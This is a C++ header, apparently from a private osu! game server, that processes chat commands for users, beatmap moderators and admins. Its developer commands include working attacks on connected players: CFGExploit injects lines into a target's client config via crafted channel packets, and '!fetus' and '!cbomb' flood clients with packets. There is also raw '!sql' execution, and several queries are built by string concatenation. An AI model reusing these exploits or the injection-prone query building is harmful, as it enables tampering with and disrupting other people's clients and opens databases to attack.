#pragma once

#define Roll(u,input)\
	[&](const uint64_t Max)->const std::string{\
		return u->Username + " rolled " + std::to_string(BR::GetRand64(0, (Max) ? Max : 100));\
	}(input)

#define TRIMSTRING(str)\
	[](std::string &s)->std::string{\
		if(!s.size())return s;\
		for(DWORD ii = s.size()-1;ii>0;ii--){\
			if(s[ii] != ' ')break;\
			s.pop_back();\
		}\
		if(s[0] != ' ')return s;\
		DWORD Start = 0;\
		for(DWORD ii=0;ii<s.size();ii++)\
			if (s[ii] != ' ') {\
				Start=ii;\
				break;\
			}\
		if(Start == 0){s.resize(0);return s;}\
		const DWORD nSize = s.size() - Start;\
		memcpy(&s[0],&s[Start],nSize);s.resize(nSize);\
		return s;\
	}((str))

__forceinline bool Fetus(const std::string &Target) {

	if (Target.size() == 0)return 0;

	_UserRef u(GetUserFromNameSafe(Target),1);

	if (!u.User)return 0;

	const _BanchoPacket b = bPacket::Message("", "", "", 0);
	u.User->qLock.lock();
	for (DWORD i = 0; i < 16; i++)
		u.User->addQueNonLocking(b);
	u.User->qLock.unlock();
	return 1;
}

std::string CFGExploit(const std::string &Target, std::string NewCFGLine){

	_UserRef u(GetUserFromNameSafe(Target),1);
	if (!u.User)return "Could not find user";

	ReplaceAll(NewCFGLine, "\\n", "\n\n");
	u.User->qLock.lock();
	u.User->HyperMode = 1;
	u.User->addQueNonLocking(_BanchoPacket(OPac::server_getAttention));
	for(DWORD i=0;i<10;i++)
		u.User->addQueNonLocking(bPacket::GenericString(OPac::server_channelJoinSuccess, "# \r\n" + NewCFGLine + "\r\nChatChannels = #osu" + std::to_string(i)));

	u.User->addQueNonLocking(bPacket::Message("BanchoBot",Target,"Do fish blink",0));

	u.User->addQueDelayNonLocking(_DelayedBanchoPacket(1, bPacket::GenericString(OPac::server_channelKicked, "BanchoBot")));

	const _BanchoPacket fPacket = bPacket::Message("", "", "", 0);
	for(DWORD i=0;i<16;i++)
		u.User->addQueDelayNonLocking(_DelayedBanchoPacket(2, fPacket));
	u.User->qLock.unlock();

	return "Done.";
}

int getBeatmapID_fHash(const std::string &H, _SQLCon* c);

bool IsBeatmapIDRanked(const DWORD ID, _SQLCon &SQL){

	if (!ID)return 0;

	sql::ResultSet *res = SQL.ExecuteQuery("SELECT ranked FROM beatmaps where beatmap_id = " + std::to_string(ID) + " LIMIT 1");

	if (!res)return 0;

	const bool Ret = !(!res || !res->next() || res->getInt(1) < 2);

	if (res) delete res;
	return Ret;
}

void RecalcSingleUserPP(const DWORD ID, _SQLCon &SQL){//This is relatively expensive. Obviously if there was an entire pp recalc a per beatmap solution would be much better (and will be made).
	
	if (!ID)return;
	
	//TODO add other modes
	for (DWORD i = 0; i < 8; i += 4) {

			const DWORD OppaiMode = i % 4;

			sql::ResultSet *res = SQL.ExecuteQuery("SELECT beatmap_md5,max_combo,mods,misses_count,accuracy,id FROM " + std::string(i > 3 ? "scores_relax" : "scores") + " WHERE userid = " + std::to_string(ID) + " AND completed = 3 AND play_mode = " + std::to_string(OppaiMode), 1);

			while (res && res->next()) {

				const DWORD BeatmapID = getBeatmapID_fHash(res->getString(1), &SQL);

				if (!IsBeatmapIDRanked(BeatmapID, SQL))
					continue;

				ezpp_t ez = ezpp_new();

				ezpp_set_mode(ez, OppaiMode);

				ezpp_set_combo(ez, res->getUInt(2));
				ezpp_set_mods(ez, res->getUInt(3));
				ezpp_set_nmiss(ez, res->getInt(4));
				ezpp_set_accuracy_percent(ez, res->getDouble(5));

				if (!OppaiCheckMapDownload(ez, BeatmapID)) {
					ezpp_free(ez);
					continue;
				}

				const float PP = ezpp_pp(ez);
				ezpp_free(ez);

				SQL.ExecuteUPDATE("UPDATE " + std::string(i > 3 ? "scores_relax" : "scores") + " SET pp = " + std::to_string(PP) + " WHERE id = " + std::to_string(res->getInt64(6)), 1);
			}DeleteAndNull(res);

			_UserStats blank;
			blank.Acc = -1.f;
			blank.pp = -1;

			UpdateUserStatsFromDB(&SQL, ID, i, blank);
			printf("TotalEndPP: %i\n", blank.pp);
	}
}

void unRestrictUser(_User* Caller, const std::string &UserName, DWORD ID) {

	if (!Caller || !(Caller->privileges & Privileges::AdminManageUsers) || (UserName.size() == 0 && !ID))
		return;

	_SQLCon SQL;

	const auto Respond = [=,&SQL](const std::string& Mess)->void {
		SQL.Disconnect();
		return Caller->addQue(bPacket::Notification(std::move(Mess)));
	};

	if (!SQL.Connect())
		return Respond("Could not connect to the SQL");

	DWORD BanPrivs = -1;

	if (!ID) {

		sql::ResultSet *res = SQL.ExecuteQuery("SELECT id, privileges FROM users WHERE username_safe = '" + UserName + "' LIMIT 1", 1);

		if (!res || !res->next()) {
			DeleteAndNull(res);
			return Respond("Failed to find a user with that name");
		}
		ID = res->getInt(1);
		BanPrivs = res->getUInt(2);
		delete res;
	}
	if (BanPrivs == -1){

		sql::ResultSet *res = SQL.ExecuteQuery("SELECT privileges FROM users WHERE id = " + std::to_string(ID) + " LIMIT 1", 1);

		if (!res || !res->next()) {
			DeleteAndNull(res);
			return Respond("Failed to find a user with that ID");
		}
		BanPrivs = res->getUInt(1);
		delete res;
	}

	if(BanPrivs & Privileges::UserPublic)
		return Respond("They do not appear to be banned.");

	BanPrivs = BanPrivs | Privileges::UserPublic;
	SQL.ExecuteUPDATE("UPDATE users SET privileges = " + std::to_string(BanPrivs) + " WHERE id = " + std::to_string(ID), 1);

	{
		_UserRef UnBanned(GetUserFromID(ID),1);
		if (UnBanned.User) {
			UnBanned->privileges = BanPrivs;
			UnBanned->choToken = 0;
		}
	}

	printf("Doing Full PP recalc on %i\n", ID);
	const int sTime = clock_ms();
	
	RecalcSingleUserPP(ID, SQL);

	printf("PP Recalc time: %i\n", clock_ms() - sTime);

	return Respond("They have been unrestricted.");
}

void SanitizeBeatmaps(_User* Caller){
	
	_SQLCon SQL;

	const auto Respond = [&](const std::string& Mess)->void {
		SQL.Disconnect();
		return Caller->addQue(bPacket::Notification(std::move(Mess)));
	};

	if (!SQL.Connect())
		return Respond("Could not connect to the SQL");


	auto res = SQL.ExecuteQuery("SELECT beatmapset_id FROM beatmaps WHERE 1", 1);

	if(!res || !res->next())
		return Respond("no beatmaps?");

	VEC(DWORD) Sets;

	do {

		const DWORD SetID = res->getUInt(1);

		for (DWORD i = 0; i < Sets.size(); i++)
			if (Sets[i] == SetID)continue;

		Sets.push_back(SetID);
	} while (res->next());

	DeleteAndNull(res);

	const DWORD Total = Sets.size();

	printf("Sets to update: %i\n", Total);

	DWORD Count = 0;

	for (DWORD zi = 0; zi < Sets.size(); zi++){

		const std::string ApiRes = GET_WEB_CHUNKED("old.ppy.sh", osu_API_BEATMAP + "s=" + std::to_string(Sets[zi]));

		auto BeatmapData = JsonListSplit(ApiRes);

		if (BeatmapData.size() != 0) {

			for (DWORD i = 0; i < BeatmapData.size(); i++) {

				const std::string beatmap_id = GetJsonValue(BeatmapData[i], "beatmap_id");
				if (!beatmap_id.size())
					continue;
				std::string Title = GetJsonValue(BeatmapData[i], "artist") + " - " + GetJsonValue(BeatmapData[i], "title") + /*" (" + GetJsonValue(BeatmapData[i], "creator") + ")*/" [" + GetJsonValue(BeatmapData[i], "version") + "]";
				FileNameClean(Title);
				ReplaceAll(Title, "'", "''");
				
				SQL.ExecuteUPDATE("UPDATE beatmaps SET song_name = '" + Title + "' WHERE beatmap_id = " + beatmap_id + " LIMIT 1");
			}

		}

		Count++;
		if (!(Count % 10000)){
			printf("%i/%i\n", Count, Total);
		}
	}


	return Respond("COMPLETED");
	
}

void RestrictUser(_User* Caller, const std::string &UserName, DWORD ID){
	
	if (!Caller || !(Caller->privileges & Privileges::AdminManageUsers) || (UserName.size() == 0 && !ID))
		return;
	
	_SQLCon SQL;

	const auto Respond = [=, &SQL](const std::string& Mess)->void {
		SQL.Disconnect();
		return Caller->addQue(bPacket::Notification(std::move(Mess)));
	};

	if (!SQL.Connect())
		return Respond("Could not connect to the SQL");

	DWORD BanPrivs = -1;

	if (!ID){

		sql::ResultSet *res = SQL.ExecuteQuery("SELECT id, privileges FROM users WHERE username_safe = '" + UserName + "' LIMIT 1",1);

		if (!res || !res->next()){
			DeleteAndNull(res);
			return Respond("Failed to find a user with that name");
		}
		ID = res->getInt(1);
		BanPrivs = res->getUInt(2);
		delete res;
	}
	if (BanPrivs == -1){

		sql::ResultSet *res = SQL.ExecuteQuery("SELECT privileges FROM users WHERE id = " + std::to_string(ID) + " LIMIT 1",1);

		if (!res || !res->next()) {
			DeleteAndNull(res);
			return Respond("Failed to find a user with that ID");
		}
		BanPrivs = res->getUInt(1);
		delete res;
	}

	if(BanPrivs & Privileges::AdminDev)
		return Respond("Developers can only be demoted directly through the SQL.");

	if(BanPrivs & Privileges::AdminManageUsers && !(Caller->privileges & Privileges::AdminDev) || ID < 1000)
		return Respond("You do not have the perms to restrict that user.");

	if (BanPrivs & Privileges::UserPublic){
		BanPrivs = Privileges::UserNormal | (BanPrivs & (Privileges::UserDonor | Privileges::Premium));//Evict them of any special standing, except donor perks.
		
		//These could be done in one. But im pretty sure its better for SQL to do multiple smaller commands than one large one.

		SQL.ExecuteUPDATE("UPDATE users SET privileges = " + std::to_string(BanPrivs) + " WHERE id = " + std::to_string(ID),1);
		SQL.ExecuteUPDATE("UPDATE scores SET pp = 0 WHERE completed = 3 AND userid = " + std::to_string(ID),1);
		SQL.ExecuteUPDATE("UPDATE scores_relax SET pp = 0 WHERE completed = 3 AND userid = " + std::to_string(ID),1);
		SQL.ExecuteUPDATE("UPDATE users_stats SET pp_std = 0 AND pp_taiko = 0 AND pp_ctb = 0 AND pp_mania = 0 WHERE id = " + std::to_string(ID), 1);
		SQL.ExecuteUPDATE("UPDATE rx_stats SET pp_std = 0 AND pp_taiko = 0 AND pp_ctb = 0 AND pp_mania = 0 WHERE id = " + std::to_string(ID), 1);
		
		for(DWORD i=0;i<8;i++)
			UpdateRank(ID, i, 1);
		{
			_UserRef Banned(GetUserFromID(ID), 1);
			//If the user is online reconnect them to update their new status :)
			if (Banned.User) {
				Banned->privileges = BanPrivs;
				Banned->choToken = 0;
			}
		}
	}else return Respond("They already appear to be restricted.");
	
	return Respond("The deed is done.");
}

#ifndef LINUX
#define CombineAllNextSplit(INDEX, SPLIT)\
	[&]()->std::string{\
		if (SPLIT.size() <= INDEX)return "";\
		if (SPLIT.size() == INDEX + 1)return SPLIT[INDEX];\
		std::string comString = SPLIT[INDEX];\
		for (DWORD i = INDEX + 1; i < SPLIT.size(); i++)\
			comString += " " + SPLIT[i];\
		return comString;\
	}()

#else

std::string CombineAllNextSplit(DWORD INDEX, const std::vector<std::string> &SPLIT){//thank you gcc

	if (SPLIT.size() <= INDEX)return "";
	if (SPLIT.size() == INDEX + 1)return SPLIT[INDEX];

	std::string comString = SPLIT[INDEX];
	for (DWORD i = INDEX + 1; i < SPLIT.size(); i++)
		comString += " " + SPLIT[i];

	return comString;
}


#endif

std::string MapStatusUpdate(_User* u, const DWORD RankStatus, DWORD SetID, const DWORD BeatmapID){

	if (!SetID && !BeatmapID)
		return "No BID or SID were given.";
	
	const char NewStatus = [&]{
		switch(RankStatus){
			case _WeakStringToInt_("rank"):
				return RankStatus::RANKED;
			case _WeakStringToInt_("unrank"):
				return RankStatus::PENDING;
			case _WeakStringToInt_("love"):
				return RankStatus::LOVED;
			case _WeakStringToInt_("lock"):
				if(u->privileges & Privileges::AdminDev)
					return RankStatus::RANK_LOCKED;
			default:
				return RankStatus::UNKNOWN;
		}
	}();

	if(NewStatus == RankStatus::UNKNOWN)
		return "Invalid status";

	const std::string StatusString = std::to_string(NewStatus);
	
	_SQLCon *const SQL = &SQL_BanchoThread[clock() & 3];//Rat a random SQL connection from the bancho threads

	sql::ResultSet *res = 0;
	
	if(!BeatmapID)
		 res = SQL->ExecuteQuery("SELECT beatmap_id, song_name FROM beatmaps WHERE beatmapset_id = " + std::to_string(SetID) + ((u->privileges & Privileges::AdminDev) ? "" : " AND ranked != -3"));
	else res = SQL->ExecuteQuery("SELECT beatmapset_id, song_name FROM beatmaps WHERE beatmap_id = " + std::to_string(BeatmapID) + ((u->privileges & Privileges::AdminDev) ? "" : " AND ranked != -3") + " LIMIT 1");
	
	if (!res || !res->next()){
		DeleteAndNull(res);
		return "Could not find any valid maps.";
	}

	if (BeatmapID)
		SetID = res->getUInt(1);
	else SQL->ExecuteUPDATE("UPDATE beatmaps SET ranked = " + StatusString + " WHERE beatmapset_id = " + std::to_string(SetID));

	std::string Announcement = u->Username + " has " + [=](){
		if (NewStatus == RankStatus::RANKED)
			return "ranked\n";
		if (NewStatus == RankStatus::PENDING)
			return "unranked\n";
		if (NewStatus == RankStatus::LOVED)
			return "loved\n";
		return "locked\n";
		}();

	if (BeatmapID){
		const std::string sBeatmapID = std::to_string(BeatmapID);
		Announcement += "[https://osu.ppy.sh/b/" + sBeatmapID + " " + res->getString(2) + "]\n";

		SQL->ExecuteUPDATE("UPDATE beatmaps SET ranked = " + StatusString + " WHERE beatmap_id = " + sBeatmapID + " LIMIT 1");

	}else do
		Announcement += "[https://osu.ppy.sh/b/" + res->getString(1) + " " + res->getString(2) + "]\n";
	while (res->next());
	
	DeleteAndNull(res);

	chan_Announce.Bot_SendMessage(std::move(Announcement));

	_BeatmapSet* bData = GetBeatmapSetFromSetID(SetID, 0);

	if (bData){
		bData->Lock.lock_shared();
		if (BeatmapID) {
			for (DWORD i = 0; i < bData->Maps.size(); i++) {
				if (bData->Maps[i].BeatmapID == BeatmapID) {
					bData->Maps[i].RankStatus = NewStatus;
					break;
				}
			}
		}
		else {
			for (DWORD i = 0; i < bData->Maps.size(); i++){
				bData->Maps[i].RankStatus = NewStatus;
			}

		}
		bData->Lock.unlock_shared();
	}

	return "Done.";
}

std::string BlockUser(_User* u, const std::string &Target, const bool UnBlock){

	auto res = SQL_BanchoThread[clock() & 3].ExecuteQuery("SELECT id from users where username_safe = '" + USERNAMESQL(Target) + "' LIMIT 1");

	DWORD UserID = 0;

	if (res && res->next())
		UserID = res->getUInt(1);

	DeleteAndNull(res);

	if (UserID < 1000)
		return "User not found.";

	if (u->UserID == UserID)
		return "You can not block your self";

	if (UnBlock){
		for (byte i = 0; i < 32; i++)
			if (u->Blocked[i] == UserID)
				u->Blocked[i] = 0;

		return "UserID " + std::to_string(UserID) + " is no longer blocked.";
	}
	u->addQue(bPacket4Byte(OPac::server_userLogout,UserID));
	return u->AddBlock(UserID) ? "UserID " + std::to_string(UserID) + " is now blocked." : "You can only block 32 players.";
}

void UpdateAllUserStats(_User* Caller){


	_SQLCon SQL;

	const auto Respond = [=, &SQL](const std::string& Mess)->void {
		SQL.Disconnect();
		return Caller->addQue(bPacket::Notification(std::move(Mess)));
	};

	if (!SQL.Connect())
		return Respond("Could not connect to the SQL");


	auto res = SQL.ExecuteQuery("SELECT id FROM users WHERE 1");


	_UserStats blank;

	while (res->next()){

		const DWORD UID = res->getInt(1);

		for (DWORD i = 0; i < 8; i++){
			blank.Acc = -1.f;
			UpdateUserStatsFromDB(&SQL, UID, i, blank);
		}
	}

	ReSortAllRank();


	return Respond("Finished");
}


const std::string ProcessCommand(_User* u,const std::string &Command, DWORD &PrivateRes){

	if (!u || Command.size() == 0 || Command[0] != '!')
		return "";

	const DWORD Priv = u->privileges;

	PrivateRes = 1;

	const auto Split = EXPLODE_VEC(std::string, Command, ' ');

	const int CommandHash = WeakStringToInt(Split[0]);
	//User Commands
	{
		switch (CommandHash) {

		case _WeakStringToInt_("!roll"):
			PrivateRes = 0;
			return Roll(u, (Split.size() > 1) ? StringToUInt64(Split[1]) : 100);

		case _WeakStringToInt_("!priv"):
			return std::to_string(Priv);
		case _WeakStringToInt_("!reconnect"):
			u->choToken = 0;
			return "";
		case _WeakStringToInt_("!block"):
			return Split.size() > 1 ? BlockUser(u, Split[1],0) : "!block <username>";
		case _WeakStringToInt_("!unblock"):
			return Split.size() > 1 ? BlockUser(u, Split[1], 1) : "!unblock <username>";
		default:
			break;
		}
	}

	if (!(u->privileges & Privileges::AdminManageBeatmaps))
		return "That is not a command.";

	//BAT Commands
	if (CommandHash == _WeakStringToInt_("!map"))
		return Split.size() > 2 ? MapStatusUpdate(u, WeakStringToInt(Split[1]), StringToUInt32(Split[2]), (Split.size() > 3) ? StringToUInt32(Split[3]) : 0)
								: "!map <rank/love/unrank> <setid> optional<beatmapid>";

	if (!(u->privileges & Privileges::AdminManageUsers))
		return "That is not a command.";

	//Admin Commands
	{
		switch (CommandHash) {

		case _WeakStringToInt_("!restrict"):
		case _WeakStringToInt_("!restrictid"):{
			if (Split.size() < 3)
				return "!restrict(id) <name / id> <reason>";

			const bool RestrictWithName = (Split[0].size() == _strlen_("!restrict"));
			const std::string RestrictName = (RestrictWithName) ? USERNAMESQL(Split[1]) : "";
			const DWORD RestrictID = (!RestrictWithName) ? StringToUInt32(Split[1]) : 0;

			{
				std::thread t(RestrictUser, u, std::move(RestrictName), RestrictID);
				t.detach();
			}

			return "";
		}

		case _WeakStringToInt_("!unrestrict"):
		case _WeakStringToInt_("!unrestrictid"):{
			if (Split.size() < 3)
				return "!unrestrict(id) <name / id> <reason>";

			const bool RestrictWithName = (Split[0].size() == _strlen_("!unrestrict"));
			const std::string RestrictName = (RestrictWithName) ? USERNAMESQL(Split[1]) : "";
			const DWORD RestrictID = (!RestrictWithName) ? StringToUInt32(Split[1]) : 0;

			{
				std::thread t(unRestrictUser, u, std::move(RestrictName), RestrictID);
				t.detach();
			}

			return "";

		}

		case _WeakStringToInt_("!silence"):{
			if (Split.size() != 3)
				return "!silence <username> <time>";

			_UserRef t(GetUserFromNameSafe(USERNAMESQL(Split[1])),1);

			if (!t.User)
				return "User not found.";

			const int Length = StringToUInt32(Split[2]);

			t.User->silence_end = time(0) + Length;
			t.User->addQue(bPacket4Byte(OPac::server_silenceEnd, Length));

			SQLExecQue.AddQue("UPDATE users SET silence_end = " + std::to_string(t.User->silence_end) + " WHERE id = " + std::to_string(t->UserID));

			return "User has been silenced";
		}

		default:
			break;
		}
	}

	if (!(u->privileges & Privileges::AdminDev))
		return "That is not a command.";

	//Dev Commands
	{
		switch (CommandHash) {

		case _WeakStringToInt_("!fetus"):
			return Fetus(USERNAMESAFE(CombineAllNextSplit(1, Split))) ? "deletus." : "Not completus. The name you should collatus.";

		case _WeakStringToInt_("!alert"):
		case _WeakStringToInt_("!alertuser"): {

			const char SingleTarget = Split[0].size() == _strlen_("!alertuser");

			const _BanchoPacket b = bPacket::Notification(CombineAllNextSplit(SingleTarget + 1, Split));

			if (!SingleTarget) {
				for (auto& User : Users)
					if (User.choToken)
						User.addQue(b);
			}
			else if (Split.size() > 1) {
				_UserRef Target(GetUserFromNameSafe(USERNAMESAFE(Split[1])),1);
				if (Target.User)
					Target.User->addQue(b);
			}

			return (!SingleTarget) ? "Alerted all online users." : "User has been alerted";
		}

		case _WeakStringToInt_("!rtx"): {

			if (Split.size() < 2)return "No target given";

			_UserRef Target(GetUserFromNameSafe(USERNAMESAFE(Split[1])),1);

			if (!Target.User || !Target.User->choToken)
				return "User not found.";

			Target.User->addQue(bPacket::GenericString(0x69, CombineAllNextSplit(2, Split)));

			return "You monster.";
		}

		case _WeakStringToInt_("!b"):
			PrivateRes = 0;
			return CombineAllNextSplit(1, Split);

		case _WeakStringToInt_("!fcfg"):
			return (Split.size() > 2) ? CFGExploit(USERNAMESAFE(Split[1]), CombineAllNextSplit(2, Split)) : "!fcfg <username> <config lines>";

		case _WeakStringToInt_("!cbomb"): {

			if (Split.size() != 3)
				return "!cbomb <username> <count>";

			_UserRef t(GetUserFromNameSafe(USERNAMESAFE(Split[1])),1);

			if (t.User) {
				const USHORT Count = USHORT(StringToInt32(Split[2]));

				t.User->qLock.lock();

				for (USHORT i = 0; i < Count; i++)
					t.User->addQueNonLocking(bPacket::GenericString(OPac::server_channelJoinSuccess, "#" + std::to_string(i)));

				t.User->qLock.unlock();
			}

			return "okay";
		}

		case _WeakStringToInt_("!setpp"): {
			if (Split.size() != 2)
				return "!cbomb <pp>";

			u->Stats[0].pp = StringToUInt32(Split[1]);
			UpdateRank(u->UserID, 0, u->Stats[0].pp);

			return "Set";
		}
		case _WeakStringToInt_("!sql"):{			
			SQL_BanchoThread[0].ExecuteUPDATE(CombineAllNextSplit(1,Split));
			return "Executed";
		}
		case _WeakStringToInt_("!recalcusers"): {
			
			{
				std::thread t(UpdateAllUserStats, u);
				t.detach();
			}

			return "running";
		}

		default:
			break;
		}
	}

	return "That is not a command.";
}